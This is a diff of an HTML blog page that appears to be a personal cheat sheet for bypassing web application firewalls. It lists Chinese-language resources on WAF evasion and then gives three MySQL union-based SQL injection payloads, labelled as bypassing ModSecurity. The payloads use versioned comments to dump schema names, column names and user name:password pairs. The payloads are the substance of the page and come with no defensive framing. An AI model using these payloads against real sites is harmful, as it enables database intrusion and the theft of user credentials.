@@ -115,7 +115,7 @@
 
         <span itemprop="articleBody"><h3 id="0x00-links">0x00 links</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>waf绕过技巧库:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waf绕过技巧库:
 http://wafbypass.me/w/index.php/Main_Page  may be a best one
 https://xianzhi.aliyun.com/forum/attachment/big_size/wafbypass_sql.pdf good
 http://www.freebuf.com/articles/web/10099.html   WAF绕过的奇技淫巧
@@ -135,17 +135,15 @@ http://mp.weixin.qq.com/s?__biz=MzIyNjQzMjcyNw==&amp;mid=2247483860&amp;idx=1&am
 https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10531  waf的fuzz思路
 https://zhuanlan.zhihu.com/p/25724834    等价替换绕过
 https://zhuanlan.zhihu.com/p/25678670    fuzz注释绕过
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="0x01-bypassed">0x01 bypassed</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>1&gt;modsecurity
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt;modsecurity
 id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.schemata*/--
 id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(column_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.columns where table_name=0x75736572*/--
 id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(name as char))),0x3a,unhex(Hex(cast(password as char))),0x27,0x7e),version(),5,6,7,8 from user*/--
-</code></pre>
-</div>
+</code></pre></div></div>
 </span>
 
         
